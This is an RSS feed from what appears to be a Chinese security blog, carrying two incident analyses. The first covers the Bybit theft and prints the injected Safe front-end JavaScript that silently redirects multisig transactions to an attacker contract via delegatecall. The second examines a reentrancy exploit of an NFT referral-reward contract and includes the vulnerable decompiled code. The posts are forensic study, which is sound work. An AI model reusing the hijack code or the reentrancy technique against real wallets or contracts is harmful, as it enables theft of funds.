<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Passi0n1's Blog</title><link>https://passi0n1.github.io/posts/</link><description>Recent content in Posts on Passi0n1's Blog</description><generator>Hugo</generator><language>zh-cn</language><copyright>Rise. 本站遵循 CC-BY-NC 4.0 协议</copyright><lastBuildDate>Tue, 08 Apr 2025 11:25:05 +0000</lastBuildDate><atom:link href="https://passi0n1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Bybit 被盗事件分析</title><link>https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</link><pubDate>Tue, 08 Apr 2025 11:25:05 +0000</pubDate><guid>https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</guid><description>&lt;h3 id="案件元数据">案件元数据&lt;/h3>
&lt;pre tabindex="0">&lt;code>被盗合约：0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4
初始黑客地址：0x47666fab8bd0ac7003bce3f5c3585383f09486e2
黑客部署的恶意合约1：0x96221423681a6d52e184d440a8efcebb105c7242
黑客部署的恶意合约2：0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516
修改逻辑合约交易：0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882
盗窃交易1：0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9
盗窃交易2：0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c
盗窃交易3：0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20
盗窃交易4：0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0
盗窃交易5：0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647

Safe 事后审计报告：https://archive.ph/OxemM
官方报告（已失效）：https://docsend.com/view/s/rmdi832mpt8u93s7
OneKey 评价：https://x.com/OneKeyCN/status/1894783804512051469
23pd 评价：https://x.com/im23pds/status/1894637152392434013
ScamSniffer 分析：https://x.com/realScamSniffer/status/1894910207052128263
黑客测试交易：https://etherscan.io/tx/0xbe42ca77d43686c822a198c3641f3dadd1edcb5fde22fbc1738b3298a9c25ddb
Verichains 报告：https://github.com/verichains/public-audit-reports/blob/main/Bybit%20Incident%20Investigation%20-%20Preliminary%20Report%20v1.0%20(for%20public%20release).pdf
Safe 官网存档：https://web.archive.org/web/20250000000000*/safe.global
ChromeCacheView 下载地址：https://www.nirsoft.net/utils/chrome_cache_view.html
&lt;/code>&lt;/pre>&lt;p>事件涉及一笔修改合约交易和五笔盗窃交易：&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235125.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;p>Safe 合约被篡改的 JS 恶意文件如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>恶意存档：
https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js

正常存档：
https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js
注：6514.b556851795a4cbaa.js 文件暂未找到，暂跳过分析。
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="具体分析">具体分析&lt;/h2>
&lt;h3 id="js-代码分析">JS 代码分析&lt;/h3>
&lt;p>以下是被篡改的核心 JS 代码片段：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sd = c; &lt;span style="color:#228b22">// Safe SDK 实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> se = e; &lt;span style="color:#228b22">// 交易对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> st = t; &lt;span style="color:#228b22">// 交易选项
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> wa = [&lt;span style="color:#cd5555">&amp;#34;0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x19c6876e978d9f128147439ac4cd9ea2582cd141&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标 Safe 地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> ba = [&lt;span style="color:#cd5555">&amp;#34;0x828424517f9f04015db02169f4026d57b2b07229&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标签名者地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> ta = &lt;span style="color:#cd5555">&amp;#34;0x96221423681a6d52e184d440a8efcebb105c7242&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 黑客恶意合约地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> da = &lt;span style="color:#cd5555">&amp;#34;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 恶意数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> op = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#228b22">// 操作类型（delegatecall）
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> vl = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#228b22">// 交易价值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sga = &lt;span style="color:#b452cd">45746&lt;/span>; &lt;span style="color:#228b22">// Safe 交易 gas 限制
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sf = sd.getSafeProvider();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sa = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sf.getSignerAddress();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sa = sa.toLowerCase();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> lu = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.getAddress();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lu = lu.toLowerCase();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> cf = wa.some(k1 =&amp;gt; lu.includes(k1)); &lt;span style="color:#228b22">// 检查是否为目标 Safe 地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> cb = ba.some(k1 =&amp;gt; sa.includes(k1)); &lt;span style="color:#228b22">// 检查是否为目标签名者地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (cf == &lt;span style="color:#8b008b;font-weight:bold">true&lt;/span> &amp;amp;&amp;amp; se.data.operation == &lt;span style="color:#b452cd">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> td = structuredClone(se.data); &lt;span style="color:#228b22">// 保存原始交易数据副本
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.to = ta; &lt;span style="color:#228b22">// 修改目标地址为黑客合约
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.operation = op; &lt;span style="color:#228b22">// 修改为 delegatecall
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.data = da; &lt;span style="color:#228b22">// 设置恶意数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.value = vl;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> se.data.safeTxGas = sga;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.executeTransaction(se, st); &lt;span style="color:#228b22">// 执行篡改后的交易
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data = td; &lt;span style="color:#228b22">// 恢复原始数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> } &lt;span style="color:#8b008b;font-weight:bold">catch&lt;/span> (e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> se.data = td;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">throw&lt;/span> e;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.executeTransaction(se, st); &lt;span style="color:#228b22">// 执行原始交易
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Verichains 提供了更清晰的注释版代码，逻辑如下：&lt;/p></description></item><item><title>StephereNFTs 遭遇重入攻击分析</title><link>https://passi0n1.github.io/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</link><pubDate>Fri, 21 Feb 2025 11:25:05 +0000</pubDate><guid>https://passi0n1.github.io/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</guid><description>&lt;h2 id="攻击概述">攻击概述&lt;/h2>
&lt;p>2025 年 2 月 ，StephereNFTs 遭遇了一起严重的重入攻击，攻击者通过精心构造的恶意合约，利用智能合约逻辑漏洞，成功盗取了大量资金。&lt;/p>
&lt;h3 id="参考地址">参考地址：&lt;/h3>
&lt;p>&lt;a href="https://nickfranklin.site/2025/02/21/stepheronfts-attacked/">https://nickfranklin.site/2025/02/21/stepheronfts-attacked/&lt;/a>&lt;/p>
&lt;h2 id="相关地址">相关地址&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>受害合约地址&lt;/strong>：&lt;code>0x9823e10a0bf6f64f59964be1a7f83090bf5728ab&lt;/code>&lt;/li>
&lt;li>&lt;strong>攻击者地址&lt;/strong>：&lt;code>0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5&lt;/code>&lt;/li>
&lt;li>&lt;strong>恶意合约1&lt;/strong>：&lt;code>0xd4c80700ca911d5d3026a595e12aa4174f4cacb3&lt;/code>&lt;/li>
&lt;li>&lt;strong>恶意合约2&lt;/strong>：&lt;code>0xb4c32404de3367ca94385ac5b952a7a84b5bdf76&lt;/code>&lt;/li>
&lt;li>&lt;strong>恶意合约3&lt;/strong>：&lt;code>0x8f327e60fb2a7928c879c135453bd2b4ed6b0fe9&lt;/code>&lt;/li>
&lt;li>&lt;strong>攻击交易 (tx)&lt;/strong>：https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877&lt;/li>
&lt;/ul>
&lt;h2 id="攻击步骤解析">攻击步骤解析&lt;/h2>
&lt;h3 id="1-部署恶意合约">1. 部署恶意合约&lt;/h3>
&lt;p>攻击者首先部署了多个恶意合约，以便后续进行重入攻击。&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/424896141-692a2eae-d3d7-40bc-b16b-d86c061c5645.png" width="100%">&lt;figcaption>
 &lt;h4>图1&lt;/h4>
 &lt;/figcaption>
&lt;/figure>
&lt;/center>
&lt;h3 id="2-通过闪电贷获取初始资金">2. 通过闪电贷获取初始资金&lt;/h3>
&lt;p>攻击者利用闪电贷借入了一笔资金，用于后续触发合约的奖励机制。&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/424903484-37fadaff-fa68-43cf-b0a7-c7d5f971b4c2.png" width="100%">&lt;figcaption>
 &lt;h4>图2&lt;/h4>
 &lt;/figcaption>
&lt;/figure>
&lt;/center>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/424903603-00bd518d-2372-4e43-a7c6-f7b91f26245d.png" width="100%">&lt;figcaption>
 &lt;h4>图3&lt;/h4>
 &lt;/figcaption>
&lt;/figure>
&lt;/center>
通过购买资产获取奖励资格
&lt;h3 id="3-通过重入攻击不断获取受害合约资金">3. 通过重入攻击不断获取受害合约资金&lt;/h3>
&lt;p>攻击者发现受害合约的奖励机制存在漏洞：&lt;/p>
&lt;ul>
&lt;li>在领取奖励时，合约会检查推荐奖励的数量。&lt;/li>
&lt;li>但由于合约先发放奖励，再将奖励计数清零，导致可以在清零前重复调用领取奖励函数，实现重入攻击。&lt;/li>
&lt;/ul>
&lt;p>攻击者利用这一漏洞，不断调用恶意合约，通过递归方式重复领取奖励，最终盗取了大量资金。&lt;/p>
&lt;h2 id="关键漏洞分析">关键漏洞分析&lt;/h2>
&lt;p>该攻击的核心漏洞在于 &lt;strong>先发奖励后清零&lt;/strong> 的逻辑顺序问题，导致了经典的重入攻击 (Reentrancy Attack)。&lt;/p>
&lt;p>&lt;strong>漏洞代码示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-solidity" data-lang="solidity">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">claimReferral&lt;/span>(&lt;span style="color:#00688b;font-weight:bold">address&lt;/span> varg0) &lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> nonPayable { find similar
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">data&lt;/span>.length - &lt;span style="color:#b452cd">4&lt;/span> &amp;gt;= &lt;span style="color:#b452cd">32&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(!_paused, Error(&lt;span style="color:#cd5555">&amp;#39;Pausable: paused&amp;#39;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0], Error(&lt;span style="color:#cd5555">&amp;#39;not-enough-money&amp;#39;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#b452cd">0x2d1e&lt;/span>(varg0, owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0], &lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0] = &lt;span style="color:#b452cd">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> emit &lt;span style="color:#b452cd">0x9c21c092f05b64df5ae0cbf557b9bf4e9695cdbeaa13fcf9a0831bce847f0cfb&lt;/span>(&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>, varg0, owner_5[&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">sender&lt;/span>][varg0]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>攻击者可以重复调用重新调用 &lt;code>claimReferral&lt;/code>，从而在清零前多次获取奖励。&lt;/p></description></item></channel></rss>